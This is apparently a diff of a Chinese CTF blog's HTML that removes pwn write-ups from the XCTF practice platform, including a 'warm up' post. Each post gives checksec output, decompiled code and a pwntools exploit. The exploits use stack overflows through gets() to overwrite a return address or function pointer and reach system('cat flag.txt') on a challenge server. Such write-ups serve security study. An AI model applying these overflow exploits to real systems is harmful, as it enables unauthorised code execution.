-<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">接下来我的想法是利用缓冲区溢出把函数指针v12 覆盖为地址0x080486cc,接下来再控制v14的值为10， 那么 &amp;v3+ --v14 便会指向</span><br><span class="line">v12，随后cat flag</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,39675)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*0x44 + p32(0x080486CC) + <span class="string">'a'</span>*0x20 + p32(0x8)</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用缓冲区溢出把函数指针v12 覆盖为地址0x080486cc,接下来再控制v14的值为10， 那么 &amp;v3+ --v14 便会指向</span></span><br><span class="line"><span class="comment">#v12，随后cat flag</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"bbb"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/warmup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xfgg">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xfgg">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/27/warmup/" itemprop="url">warm up</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T18:52:55+08:00">
-                2019-07-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/攻防世界/" itemprop="url" rel="index">
-                    <span itemprop="name">攻防世界</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec warmup</span><br><span class="line"></span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/warmup'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">只开启了nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+0h] [rbp-80h]</span><br><span class="line">  char v5; // [rsp+40h] [rbp-40h]</span><br><span class="line"></span><br><span class="line">  write(1, <span class="string">"-Warm Up-\n"</span>, 0xAuLL);</span><br><span class="line">  write(1, <span class="string">"WOW:"</span>, 4uLL);</span><br><span class="line">  sprintf(&amp;s, <span class="string">"%p\n"</span>, sub_40060D);</span><br><span class="line">  write(1, &amp;s, 9uLL);</span><br><span class="line">  write(1, <span class="string">"&gt;"</span>, 1uLL);</span><br><span class="line">  <span class="built_in">return</span> gets(&amp;v5, <span class="string">"&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gets(&amp;v5, <span class="string">"&gt;"</span>);  栈溢出漏洞利用</span><br><span class="line"></span><br><span class="line">int sub_40060D()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> system(<span class="string">"cat flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system函数</span><br><span class="line"></span><br><span class="line">-0000000000000040 var_40          db ?</span><br><span class="line">-000000000000003F                 db ? ; undefined</span><br><span class="line">-000000000000003E                 db ? ; undefined</span><br><span class="line">-000000000000003D                 db ? ; undefined</span><br><span class="line">-000000000000003C                 db ? ; undefined</span><br><span class="line">-000000000000003B                 db ? ; undefined</span><br><span class="line">-000000000000003A                 db ? ; undefined</span><br><span class="line">-0000000000000039                 db ? ; undefined</span><br><span class="line">-0000000000000038                 db ? ; undefined</span><br><span class="line">-0000000000000037                 db ? ; undefined</span><br><span class="line">-0000000000000036                 db ? ; undefined</span><br><span class="line">-0000000000000035                 db ? ; undefined</span><br><span class="line">-0000000000000034                 db ? ; undefined</span><br><span class="line"></span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line"></span><br><span class="line">覆盖v5只需要0x48个字节就可以了</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用栈溢出覆盖gets中的v5，写入system函数的地址即可</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">非常简单的64位栈溢出</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,41315)</span><br><span class="line">sys_addr = 0x000000000040060D</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*0x40+<span class="string">'a'</span>*8+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1820,7 +1838,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">37</span>
+                  <span class="site-state-item-count">39</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
